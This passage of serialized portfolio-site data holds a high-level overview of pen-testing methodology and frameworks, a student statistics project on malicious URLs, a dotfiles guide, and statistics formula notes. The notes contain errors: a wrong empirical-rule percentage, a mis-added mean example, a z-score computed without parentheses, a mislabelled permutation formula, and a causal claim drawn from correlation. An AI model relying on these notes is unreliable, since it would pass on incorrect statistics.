Methodology",duration:v,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fpentest.png",tech:[{name:"attack"},{name:"pen-testing"},{name:"methodology"},{name:"practices"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-09-19T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fpentest-methodology",extension:g,updatedAt:a,bodyPlainText:"\n\n# pen-testing methodologies & practices\n\nA penetration test is an attack that is used to assess the security of an information system in order to uncover system weaknesses and offer security fixes.\n\nThe goals of penetration testing and vulnerability testing are different. Automatic scanners are used in vulnerability testing to quickly discover the most frequent flaws. Penetration testing takes things a step further. It entails looking for logical faults that aren't detectable by automated methods, as well as a phase of manual exploitation of the discovered vulnerabilities. It's a more comprehensive and tried-and-true security audit process that allows you to assess the true effect of any flaw.\n\nBlack box, grey box, and white box penetration testing are examples of penetration tests. Grey-box testing target regions accessible only to customers, partners, or employees of an organization, whereas black-box tests target the attack surface open to any external attacker. The white box audit, on the other hand, allows you to assess the level of security by having the same level of access as a system administrator.\n\nA security audit report, which contains the found vulnerabilities, defined by criticality level, as well as technical recommendations for remedy, is the deliverable sent out after a penetration test. A non-technical summary of the report can also be delivered for presentation to the management committee or partners.\n\n## Phases \n\nA penetration test is built on a cyclic four-phase methodology: reconnaissance, mapping, discovery, and exploitation.\n\n### Recon\n\nThe recon step entails looking for open-source information on the security audit's objective. IP addresses, domain and sub-domain names, types and versions of technologies utilized, technical information disclosed on forums or social networks, data leaks, and other information that could be valuable to an attacker is gathered.\n\n### Mapping\n\nThe mapping phase allows you to list all of the audit target's functions. This stage allows pentesters to have a better view of the most important and vulnerable elements. When the goal of the security audit is to test all of a target's functionalities, this stage is especially important.\n\n### Discovery\n\nThe discovery phase is similar to the attack phase in that pentesters hunt for vulnerabilities manually and with the use of automated technologies. The goal is to find as many vulnerabilities on the target as possible.\n\n### Exploitation\n\nThe exploitation phase consists in testing possible exploitations of the flaws identified in the previous phase. This step allows using certain flaws as “pivots”, in order to discover new vulnerabilities. The exploitation of security vulnerabilities allows evaluating their real impact and thus their criticality level.\n\n### subsequent steps (post exploitation)\n\nAs the name implies, post exploitation refers to the phases of operation that occur after an attacker has compromised a victim's system. The value of the compromised system is determined by the actual data stored in it and how an attacker may use it for malicious purposes. The concept of post-exploitation arose solely as a result of how you can use the information from the victim's compromised system. This phase is responsible for gathering sensitive information, documenting it, and having a general understanding of the configuration settings, network interfaces, and other communication channels. These could be used by the attacker to maintain persistent access to the system.\n\n- Cleaning tracks and staying undetected\n- Collecting system information and data\n- Setting up backdooring and rootkits\n- Privilege escalation (full admin rights)\n\n## Standard methodologies \n\nDepending on which standards and procedures are used, penetration tests and security audits might produce quite diverse findings. Companies that need to secure their systems and solve their cybersecurity vulnerabilities should use updated penetration testing standards and methodology.\n\nHere are five approaches and criteria for penetration testing that can ensure a return on your investment:\n\n### OSSTMM\n\nThe [OSSTMM](https:\u002F\u002Fwww.isecom.org\u002FOSSTMM.3.pdf) framework, one of the industry's most widely accepted standards, provides a scientific methodology for network penetration testing and vulnerability assessment. This framework includes a comprehensive guide for testers to use when identifying security vulnerabilities in a network (and its components) from various potential attack angles. This methodology is based on the tester's extensive knowledge and experience, as well as human intelligence, to interpret identified vulnerabilities and their potential impact on the network.\n\n### OWASP\n\nThe Open Web Application Security Project ([OWASP](https:\u002F\u002Fowasp.org\u002F)) is the industry standard for all aspects of application security. This methodology, backed by a very knowledgeable community that stays up to date on the latest technologies, has assisted countless organizations in reducing application vulnerabilities. Methodology of OWASP\n\nThis framework provides a methodology for application penetration testing that can identify not only common vulnerabilities in web and mobile applications, but also complex logic flaws caused by unsafe development practices. The updated guide provides comprehensive guidelines for each penetration testing method, with over 66 controls to assess in total, allowing testers to identify vulnerabilities in a wide range of functionalities found in today's modern applications.\n\n### NIST\n\n[NIST](https:\u002F\u002Fwww.nist.gov\u002Fcyberframework), in contrast to other information security manuals, provides more specific guidelines for penetration testers to follow. The National Institute of Standards and Technology (NIST) provides a manual that is best suited to improving an organization's overall Cybersecurity. The most recent version, 1.1, emphasizes Critical Infrastructure Cybersecurity. Compliance with the NIST framework is frequently a regulatory requirement for a variety of American providers and business partners.\n\nWith this framework, NIST aimed to ensure information security in a variety of industries, including banking, communications, and energy. Large and small businesses alike can tailor the standards to their specific requirements.\n\n### PTES\n\nThe [PTES](http:\u002F\u002Fwww.pentest-standard.org\u002Findex.php\u002FMain_Page) Framework (Penetration Testing Methodologies and Standards) highlights the best approach for structuring a penetration test. This standard guides testers through the various stages of a penetration test, such as initial communication, information gathering, and threat modeling.\n\n### ISSAF\n\nThe [ISSAF](https:\u002F\u002Fwww.oissg.org\u002F) standard (Information System Security Assessment Framework) takes a more structured and specialized approach to penetration testing than the previous standard. If your organization's unique situation necessitates an advanced methodology that is completely tailored to its context, then this manual should be useful for the specialists in charge of your penetration test. \n\n\n\n\n\nSources:\n\n- [vumetic](https:\u002F\u002Fwww.vumetric.com\u002Fblog\u002Ftop-penetration-testing-methodologies\u002F)\n- [packtpub](https:\u002F\u002Fsubscription.packtpub.com\u002Fbook\u002Fnetworking-and-servers\u002F9781782163589\u002F7\u002Fch07lvl1sec34\u002Fwhat-is-post-exploitation)\n",readingTime:n},{slug:"minor_privacy",description:"Privacy for the user while developing software",id:j,title:"Privacy in software applications",duration:v,image:q,tech:[{name:m},{name:"privacy"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:r,dir:i,path:"\u002Fprojects\u002Fminor\u002Fprivacy",extension:g,updatedAt:a,bodyPlainText:K,readingTime:l},{slug:"minor_secure-development",description:"Privacy for the user while developing software \u002F Security while developing software \u002F Security in a project lifecycle",id:j,title:"Secure-development",duration:v,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fsecure-development.png",tech:[{name:m},{name:"secure-development"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-09-26T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fsecure-development",extension:g,updatedAt:a,bodyPlainText:K,readingTime:l},{slug:"minor_statistics",description:"Basic knowledge building for preparation master studies. Here I learn to perform statistical analysis and draw conclusions",title:w,duration:"full time 1 week",image:L,tech:[{name:w},{name:s},{name:u}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:j,twitter:f},github:I,createdAt:M,dir:i,path:"\u002Fprojects\u002Fminor\u002Fstatistics",extension:g,updatedAt:a,bodyPlainText:"\n# Statistics \n## Introduction\nDuring this semester, I would like to learn more about statistics and its application. \nIn doing so, I want to learn how to interpret data, analyze it, and draw conclusions. \nThis by setting up hypotheses and testing them. I would like to learn all this so I can apply it in my own projects. This will also come in handy for my follow-up study \"Data Science\" that I want to follow at the TUe. In the statistics course I will make a link with the Cyber subject by doing an analysis on Cyber related data. \nThis means I'm going to look for correlations between certain labels that have to do with, for example, malware. To show that I can apply the knowledge I have learned, I will analyze a dataset and present the data clearly and above all to people who are interested in it.\nIn order to apply statistics, a thorough knowledge of the mathematical formulas behind the analysis of these data is required. I learn this mathematics by following the course on \"Khan acandemy\". \nBy attending the lessons given by Peter Lambooij, a teacher at Fontys, I will make my knowledge measurable. During the lessons, we work on a project; we have to apply the knowledge we have learned. \nI am going to demonstrate this learning goal by showing the results and outcomes that have been released by Peter Lambooij. The results of the knowledge gained from the subject of statistics can be seen in the research. This research was conducted as a project within the subject of statistics. \n\n## Evaluate\n### Version (1)\nBelow are the results of that were obtained in the unit tests of the subject of statistics: \n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Ffirst_results.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Ffirst_results.png\" alt=\"First test results\"\u002F\u003E\n\u003C\u002Fa\u003E\nAbove is the current status of the unit tests created for the subject of statistics. The unit tests were taken on the Khanacademy platform.  As seen above, all unit tests were passed with a minimum score of 70% or higher.  Since the workload is very high, it was difficult to keep up with all the material that was given each week. Also, the material itself was very difficult and sometimes hard to understand. During these first weeks I learned what the subject of statistics is and when and what it is used for. I also learned what static research is and the formulas that go with it by making hypotheses. \n\n[Khan academy - statistics-probability](https:\u002F\u002Fwww.khanacademy.org\u002Fmath\u002Fstatistics-probability)\n\n### Version (2)\n\nIn my previous evaluation I showed my results from the beginning to the middle of the course. In this evaluation I have now finished the course and both my project and my khan unit have been evaluated. The given results are shown below:\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fsecond_results.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fsecond_results.png\" alt=\"second test results\"\u002F\u003E\n\u003C\u002Fa\u003E\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fresearch_project.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fresearch_project.png\" alt=\"research project result\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nI am very happy that I was able to attend this course. It has taught me a lot and has contributed greatly to the continuation of my studies. Even though I find the formulas difficult to apply within real examples at the moment. The remaining weeks of this minor I want to make these formulas my own so that they are engraved in my brain. \n\n## Assignments\n### Research project\n\nConduct scientific research by establishing hypotheses, analyzing and concluding. \n\nThe detailed research can be read in the research document an abbreviated version of this with executable code in also obtainable by reading out the Jupiter notebook. \n\n#### Gibbarish URL makes malware significantly more likely to occur\nH0 - There is no correlation between a specific URL construction and a malicious label.\n\n*H0: Gibberish ≠ malicious* \n\nH1 - There is a correlation between a specific URL construction and a malicious label.\n\n*H1:  Gibberish = malicious*\n\n\n#### Javascript volume makes malware significantly more likely\nH0 - There is no correlation between javascript volume and a malicious label.\n\n*H0: code volume ≠ malicious*\n\nH1 - There is a correlation between javascript volume and a malicious label.\n\n*H1: code volume = malicious*\n\n\n\n### Conclusion\n\n#### Javascript volume makes malware significantly more likely\n\nThe study showed that there is a causal relationship between the volume of javascript loaded and the likelihood of malicious or a rogue site.  \n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fplot.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"50%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fplot.png\" alt=\"plot\"\u002F\u003E\n\u003C\u002Fa\u003E\n\n| count |     mean |        std |        min |   25% |   50% |   75% |   max |       |\n| ----: | -------: | ---------: | ---------: | ----: | ----: | ----: | ----: | ----: |\n| label |          |            |            |       |       |       |       |       |\n|   bad |   7684.0 | 584.931481 | 156.729323 | 315.0 | 448.2 | 584.1 | 721.8 | 854.1 |\n|  good | 336151.0 | 114.667426 |  49.144527 |  30.0 |  72.0 | 114.5 | 157.5 | 199.5 |\n\n\n***\n\nRecourses: \n- [Drive by download](https:\u002F\u002Fwww.kaspersky.com\u002Fresource-center\u002Fdefinitions\u002Fdrive-by-download)\n\n***\n# Appendix\n## Mail contact \nAgreement to attend external classes\n\nTo: j.geurts@fontys.nl \\\nSubject: Attending Tav\n\nDear, Joris  \nI am currently doing the minor in Cyber Security. \nAfter this minor and graduation I would like to do the pre-master \"Data science & ai\" at the tue. \nIn order to do this pre-master I need to prepare myself well and I need to take a number of courses in my spare time. \nSo this is what I am currently doing.\n\nThe following courses I need before I can start the pre-master, with an indication of the study load.\nThese courses consist of:\n- Mathematica B - 12 hours a week.\n- (1) Linear algebra - 10 hours in the week\n- (2) Statistics - 3 hours in the week\n- English C1 Cambridge (New 2021) - 3 hours in the week  \n  Optional courses: (1) or (2)  \n  In addition, I also want to prepare in advance for the courses that will be given during this pre-master, these are for example:\n- Logic - 2.5 hours per week\n- Data structures - 2.5 hours per week\n\nMy question; is it possible to master the above subjects through self-study with the theory as given in the pre-master? \nI have been given the material by students who are currently following the pre-master.\n\nKind regards,\nRik Peeters\nSoftware Engineering & Cyber  \n\n*- _Through the following email I came into contact with joris geurts.\nAfter personal consultation he has given permission to attend classes related to the tav course.\nIn doing so, I came into contact with the teachers who teach the tav classes. \nthey have guided me and increased my knowledge_\n",readingTime:n},{slug:"other_dotfiles",description:"Why it is important to keep your .dotfiles safe.",id:j,title:"Dotfiles",duration:x,image:"\u002Fimages\u002Fprojects\u002Fother\u002Fdotfiles.png",tech:[{name:"linux"},{name:".dotfiles"}],category:[{name:c},{name:b}],author:{name:d,image:e,social:{twitter:f}},github:"https:\u002F\u002Fgithub.com\u002Frikp777\u002F.dotfiles",createdAt:r,dir:o,path:"\u002Fprojects\u002Fother\u002Fdotfiles",extension:g,updatedAt:a,bodyPlainText:"\n# .dotfiles\n\nDotfiles are plain text configuration files on Unix-y systems for things like our shell, `~\u002F.zshrc`, our editor in `~\u002F.vimrc`, and many others. They are called \"dotfiles\" as they typically are named with a leading `.` making them hidden files on your system, although this is not a strict requirement.\n\nSince these files are all plain text, we can gather them together in a git repository and use that to track the changes you make over time.\n\nIdeally, you store your personal files not on your machine only. If you have your files on either local drives (e.g. USB drive, NAS) or in the cloud (Dropbox, Google Docs, iCloud, etc., etc.), you save yourself from the risks of machine theft, damage, or hardware failure.\n\nNow your documents, photos, etc. are kind of safe. Still, if you ever have to setup a system, you need to install every single application again. I can’t count the times I needed to find the application’s download page, download, install. Next. Next. Again. You forgot one. One more.\n\nSo, how awesome is it that we can automate all this? You may not realize it, but most system tools, applications and settings can be installed in an automated fashion. I don’t know about you, but this is like music to my ears!\n\nToday, I could literally throw my laptop out of the window, buy a new one, and be up and running in a matter of minutes.\n\nIt’s pretty simple to get started. You need to organize your dotfiles in some directory. You could do this practically anywhere, like a USB drive or something. Since version control is great, a hosted git repository like GitHub is a great option to store your dotfiles.\n\n# GitHub ❤ `~\u002F`\n\nWhy would I want my dotfiles on GitHub?\n\n- **Backup** **restore**, and **sync** the prefs and settings for your toolbox. Your dotfiles might be the most important files on your machine.\n- **Learn** from the community. Discover new tools for your toolbox and new tricks for the ones you already use.\n- **Share** what you’ve learned with the rest of us.\n\n## Structure\n\nBelow is the structure of my dotfiles repo. It’s also what we’ll use in our walk-through below.\n\n```\n📂 .\n\n├── 📁 git\n|  ├── 🌑 .gitconfig\n│  └── 🌑 .gitignore_gobal\n├── 📂 nvim\n│  └── 📂 .config\n└── 🌑 install.sh\n```\n\nby default no such directory exist within your system so you will have to create one your own in you root directory. ```mkdir .dotfiles```\n\nwhen created you can move your configuration files to the folder you just created but be warned you need to follow the folder struture above so for every configuration you want to store you need to make a directory with its name. But because you now moved your files your settings will not be in the right directory anymore so all programs that use those settings are broken. But now we are going to restore those links. This we are going to do by GNU Stow.\n\n### About GNU Stow\n\nGNU Stow describes itself as a \"symlink farm manager\", but in practical terms it's just a prgram that can mirror the structure of one directory into another by creating symbolic links back to the original files \n\nThis is extremely useful when you have a directory full of configuration files that is managed by Git and you want to send all of those configuration files to where they belong in you home directory. \n\nGNU Stow walks the file and directory hiearch of the directory passes as the first aparameter to the stow command and creates symbolic links to those files in the equivalent location in the target directory. \n\nThe important thing to be ware of here is that our dotfiles directory must have the same layout as where the files would be placed under the home directory. This means you will need to have quivalent subdirectory structure in you dotfiles folder so that all symoblic lniks get created in the right place. \n",readingTime:"4 min read"},{slug:"other_statistic-formulas",description:"Formulas explained",title:"Statistic 1",duration:"2 whole day in total",image:L,tech:[{name:s},{name:w}],category:[{name:c},{name:b}],author:{name:d,image:e,social:{twitter:f}},createdAt:M,dir:o,path:"\u002Fprojects\u002Fother\u002Fstatistic-formulas",extension:g,updatedAt:a,bodyPlainText:"small\nI am a visual learner so I find it hard to understand material by just reading it I have to make myself visual illustrations this has done both the khan cource for me and the many notes I have made. \n\n# Statistical formulas\n\n## Summarizing quantitative data\n\n### quantitative data\n\n#### Mean\n\nWhen you first started out in mathematics, you were probably taught that an average was a “middling” amount for a set of numbers. You added up the numbers, divided by the number of items you can and *voila*! you get the average. For example, the average of 10, 5 and 20 is:\n\n10 + 6 + 20 = 36 \u002F 3 = 12.\n\nThe you started studying statistics and all of a sudden the “average” is now called the mean. *What happened?* The answer is that they have the same meaning(they are synonyms).\n\n#### Mode \n\nThe mode is the value that appears most frequently in a data set. A set of data may have one mode, more than one mode, or no mode at all. Other popular measures of central tendency include the mean, or the average of a set, and the [median](https:\u002F\u002Fwww.investopedia.com\u002Fterms\u002Fm\u002Fmedian.asp), the middle value in a set.\n\n#### Median\n\nThe median is the middle number in a sorted, ascending or descending, list of numbers and can be more descriptive of that data set than the average. \n\nMedian is the middle number in a sorted list of numbers. To determine the median value in a sequence of numbers, the numbers must first be sorted, or arranged, in value order from lowest to highest or highest to lowest. The median can be used to determine an approximate average, or [mean](https:\u002F\u002Fwww.investopedia.com\u002Fterms\u002Fm\u002Fmean.asp), but is not to be confused with the actual mean.\n\nThe absolute middle of an ordered ascending set of numbers. \n\n### Interquartile range (IQR)\n\nWhen a data set has outliers or extreme values, we summarize a typical value using the ***median\\*** as opposed to the mean. When a data set has outliers, variability is often summarized by a statistic called the ***interquartile range\\***, which is the difference between the first and third quartiles. The first quartile, denoted Q1, is the value in the data set that holds 25% of the values *below* it. The third quartile, denoted Q3, is the value in the data set that holds 25% of the values *above* it. The quartiles can be determined following the same approach that we used to determine the median, but we now consider each half of the data set separately. \n\nIt kind of is like the mean of every 50% of the set.\n\n#### Example \n\n##### Normal\n\nSet: 62, 63, | 64 |, 64, 70, || 72, 76, | 77 |, 81,81\n\nMedian = (70 + 72) \u002F 2 = 71\n\nMean = 71\n\nQ1 = 64\n\nQ3 = 77\n\n\n\n##### Odd number\n\nSet:  63, | 64 , 64 |, 70, | 72 |, 76, | 77, 81 | ,81\n\nMedian = 72\n\nMean = 72\n\nQ1 = (64 + 64) \u002F 2 = 64\n\nQ3 = (77 + 81) \u002F 2 = 79\n\n### Variance and standard deviation of a population\n\nInterestingly, in the real world no statistician would ever calculate standard deviation by hand. The calculations involved are somewhat complex, and the risk of making a mistake is high. Also, calculating by hand is slow. Very slow. This is why statisticians rely on spreadsheets and computer programs to crunch their numbers.\n\n#### Population\n\nThe formula for standard deviation (SD) is:\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;\\text{SD} \u002F= \\sqrt{\\dfrac{\\sum\\limits_{}^{}{{\\lvert x- \\mu \\rvert^2}}}{N}}\" title=\"formula\" \u002F\u003E\n\nwhere ∑ sum means \"sum of\", x is a value in the data set, μ is the mean of the data set, and *N* is the number of data points in the population.\n\nThe standard deviation formula may look confusing, but it will make sense after we break it down. In the coming sections, we'll walk through a step-by-step interactive example. Here's a quick preview of the steps we're about to follow:\n\n#### Sample\n\nThe formula above is for finding the standard deviation of a population. If you're dealing with a sample, you'll want to use a slightly different formula (below), which uses n-1,  instead of *N*. \n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;\\text{SD} = \\sqrt{\\dfrac{\\sum\\limits_{}^{}{{\\lvert x- \\bar{x} \\rvert^2}}}{n -1}}\" title=\"formula\" \u002F\u003E\n\n\n\n### Mean absolute deviation (MAD)\n\nThe mean absolute deviation of a dataset is the average distance between each data point and the mean. It gives us an idea about the variability in a dataset.\n\nHere's how to calculate the mean absolute deviation.\n\n**Step 1:** Calculate the mean.\n\n**Step 2:** Calculate how far away each data point is from the mean using positive distances. These are called absolute deviations.\n\n**Step 3:** Add those deviations together.\n\n**Step 4:** Divide the sum by the number of data points.\n\nFollowing these steps in the example below is probably the best way to learn about mean absolute deviation, but here is a more formal way to write the steps in a formula:\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;\\text{MAD} = \\dfrac{\\sum\\limits_{}^{}{{\\lvert x_{i}- \\bar{x} \\rvert}}}{n}\" title=\"formula\" \u002F\u003E\n\n\n\n## Modeling data distributions\n\n### Distribution\n\n#### Normal\n\nThe normal distribution is the most common type of distribution assumed in technical stock market analysis and in other types of statistical analyses. The standard normal distribution has two parameters: the mean and the [standard deviation](https:\u002F\u002Fwww.investopedia.com\u002Fterms\u002Fs\u002Fstandarddeviation.asp). For a normal distribution, 68% of the observations are within +\u002F- one standard deviation of the mean, 95% are within +\u002F- two standard deviations, and 99.7% are within +- three standard deviations.\n\n##### Empirical rule \n\nIn statistics, the empirical rule states that 99.7% of data occurs within three standard deviations of the mean within a normal distribution. To this end, 68% of the observed data will occur within the first standard deviation, 95% will take place in the second deviation, and 97.5% within the third standard deviation. The empirical rule predicts the probability distribution for a set of outcomes. \n\nThe empirical rule is applied to anticipate probable outcomes in a normal distribution. For instance, a statistician would use this to estimate the percentage of cases that fall in each standard deviation. Consider that the standard deviation is 3.1 and the mean equals 10. In this case, the first standard deviation would range between (10+3.2)= 13.2 and (10-3.2)= 6.8. The second deviation would fall between 10 + (2 X 3.2)= 16.4 and 10 - (2 X 3.2)= 3.6, and so forth. \n\n#### Skewness\n\n##### Left\n\nA **[left-skewed distribution](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fskewed-distribution\u002F#SkewLeft)** has a long left tail. Left-skewed distributions are also called *negatively-skewed* distributions. That’s because there is a [long tail](https:\u002F\u002Fwww.statisticshowto.com\u002Flong-tail-distribution\u002F) in the negative direction on the number line. The mean is also to the left of the [peak](https:\u002F\u002Fwww.statisticshowto.com\u002Fpeak-of-a-distribution\u002F).\n\nIn most cases, the [mean ](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fstatistics-definitions\u002Fmean-median-mode\u002F#mean)is to the left of the median. This isn’t a reliable test for skewness though, as some distributions (i.e. many [multimodal distributions](https:\u002F\u002Fwww.statisticshowto.com\u002Fmultimodal-distribution\u002F)) violate this rule. You should think of this as a “general idea” kind of rule, and not a set-in-stone one.\n\n##### Right\n\nA **[right-skewed distribution](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fskewed-distribution\u002F#SkewRight)** has a long right tail. Right-skewed distributions are also called positive-skew distributions. That’s because there is a long tail in the positive direction on the number line. The [mean ](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fstatistics-definitions\u002Fmean-median-mode\u002F#mean)is also to the right of the peak.\n\nOn a right-skewed histogram, the mean, median, and mode are all different. In this case, the mode is the highest point of the histogram, whereas the median and mean fall to the right of it (or, visually, the right of the peak). Note that [the mean will *always* be to the right of the median](http:\u002F\u002Fwww.statisticshowto.com\u002Fskewed-distribution\u002F).\n\n### Percentile Formula\n\n**Percentile = (Number of Values Below “x” \u002F Total Number of Values) × 100**\n\nP = (n\u002FN) × 100\n\nWhere, \n\n- n = ordinal rank of the given value or value below the number\n- N = number of values in the data set \n- P = percentile \n\nOr \n\nPercentile = (Number of Values Below “x” \u002F Total Number of Values) × 100\n\n### Z-scores\n\n**Simply put, a z-score (also called a \\*standard score\\*) gives you an idea of how far from the [mean](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fstatistics-definitions\u002Fmean-median-mode\u002F) a data point is.** But more technically it’s a measure of how many [standard deviations](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fstandard-deviation\u002F) below or above the [population mean ](https:\u002F\u002Fwww.statisticshowto.com\u002Fpopulation-mean\u002F)a [raw score](https:\u002F\u002Fwww.statisticshowto.com\u002Fraw-score\u002F) is.\n\nA z-score can be placed on a [**normal distribution**](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fnormal-distributions\u002F) curve. Z-scores range from -3 standard deviations (which would fall to the far left of the normal distribution curve) up to +3 standard deviations (which would fall to the far right of the normal distribution curve). In order to use a z-score, you need to know the [mean](https:\u002F\u002Fwww.statisticshowto.com\u002Fprobability-and-statistics\u002Fstatistics-definitions\u002Fmean-median-mode\u002F#mean) μ and also the population standard deviation σ.\n\n#### Bases \n\nSimply put, a z-score (also called a standard score) gives an idea of how far away it is from the mean value of a data point. More technically, it is a measure of the number of standard deviations below or above the given population that signify a raw score.\n\nDe basis z-scoreformule voor een steekproef is:\n\nz = (x – μ) \u002F σ\n\nwhere:\n\n- **x:** individual data value\n- **μ:** population mean\n- **σ:** population standard deviation\n\nA z-score for an individual value can be interpreted as follows:\n\n- **Positive z-score:** The individual value is greater than the mean.\n- **Negative z-score:** The individual value is less than the mean.\n- **A z-score of 0:** The individual value is equal to the mean.\n\n##### Example\n\nFor example, let's say you have a test score of 190. The test has a mean (μ) of 150 and a standard deviation (σ) of 25. Assuming a normal distribution, your z score would be:\n\nz = (x – μ) \u002F σ\n\n= 190 – 150 \u002F 25 = 1.6.\n\nThe z-score tells you as many standard deviations from the mean of your score. In this example, your score is 1.6 standard deviations above the mean.\n\n#### Standard error of the mean\n\nIf you have multiple samples and want to describe the standard deviation of those samples (the standard deviation), you would use this z-score formula:\n\nz = (x – μ) \u002F (σ \u002F √n)\n\nThis z-score tells you that there are many standard errors between the sample mean and the population mean.\n\n##### Example\n\nIn general, the average height of women is 65″ with a standard deviation of 3.5″. What is the probability of finding a random sample of 50 women with a mean height of 70″, assuming the heights are normally distributed?\n\nz = (x – μ) \u002F (σ \u002F √n)\n\n= (70 – 65) \u002F (3.5\u002F√50) = 5 \u002F 0.495 = 10.1\n\n## Probability\n\nRandomness is all around us. Probability theory is the mathematical framework that allows us to analyze chance events in a logically sound manner. The probability of an event is a number indicating how likely that event will occur. This number is always between 0 and 1, where 0 indicates impossibility and 1 indicates certainty.\n\nA classic example of a probabilistic experiment is a fair coin toss, in which the two possible outcomes are heads or tails. In this case, the probability of flipping a head or a tail is 1\u002F2. In an actual series of coin tosses, we may get more or less than exactly 50% heads. But as the number of flips increases, the long-run frequency of heads is bound to get closer and closer to 50%.\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;P(E)=\\sum _{x\\in E}f(x)\\,.\" title=\"formula\" \u002F\u003E\n\n\n\n```P(A) = (# of ways A can happen) \u002F (Total number of outcomes)```\n\n- The probability of an event can only be between 0 and 1 and can also be written as a percentage or fraction.\n- The probability of event *A* is often written as ```P(A)```.\n- If ```P(A) \u003E P(B)```,  then event *A* has a higher chance of occurring than event *B*.\n- If ```P(A) = P(B)```, then events *A* and *B* are equally likely to occur.\n\n## Combinations and Permutations\n\nThe difference between combinations and permutations is ordering. **With permutations we care about the order of the elements, whereas with combinations we don’t.**\n\nFor example, say your locker “combo” is 5432. If you enter 4325 into your locker it won’t open because it is a different ordering (aka permutation).\n\nThe **permutations** of 2, 3, 4, 5 are:\n\n- **5432,** 5423, 5324, 5342, 5234, 5243, 4532, 4523, 4325, 4352, 4253, 4235, 3542, 3524, 3425, 3452, 3254, 3245, 2543, 2534, 2435, 2453, 2354, 2345\n\n  24 combinations\n\nYour locker “combo” is a specific permutation of 2, 3, 4 and 5. If your locker worked truly by combination, you could enter any of the above permutations and it would open!\n\nSuppose you want to know how many permutations exist of the numbers 2, 3, 4, 5 without listing them like I did above. How would you accomplish this?\n\nUsing the *Multiplication Principle of combinatorics,* we know that if there are *x* ways of doing one thing and *y* ways of doing another, then the total number of ways of doing both things is *x•y*. That means we need to multiply to find the total permutations.\n\nThis is a great opportunity to use shorthand **factorial notation (!)**:\n\n4! = 4*•*3*•*2*•*1 = 24\n\nThere are 24 permutations, which matches the listing we made at the beginning of this post.\n\n### Permutations with Repetition\n\nWhat if I wanted to find the total number of permutations involving the numbers 2, 3, 4, and 5 but want to include orderings such as 5555 or 2234 where not all of the numbers are used, and some are used more than once?\nHow many of these permutations exist?\nThis turns out to be a simple calculation. Again we are composing a 4-digit number, so draw 4 lines to represent the digits.\n\n4•4•4•4 = 4^4 = 256\n\n### Combinations Formula\n\nIf we have *n* objects and we want to choose *k* of them*,* we can find the total number of combinations by using the following formula:\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{k!(n-k)!}\" title=\"formula\" \u002F\u003E\n\nFor example, we have 52 cards (n=52) and want to know how many 5-card hands (k=5) we can make.\n\nPlugging in the values we get:\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;(\\dfrac{52}{5}) = \\dfrac{52!}{5!(52-5)!}\" title=\"formula\" \u002F\u003E\n\n### Permutations Formula\n\nThe formula for permutations is similar to the combinations formula, except we needn’t divide out the permutations, so we can remove k! from the denominator:\n\n\u003Cimg src=\"https:\u002F\u002Flatex.codecogs.com\u002Fsvg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{(n-k)!}\" title=\"formula\" \u002F\u003E\n\n\n\nsources: \n\n[datascience.eu](https:\u002F\u002Fdatascience.eu\u002Fnl\u002Fwiskunde-statistiek\u002Fwat-is-een-z-score\u002F)\n\n[Khan 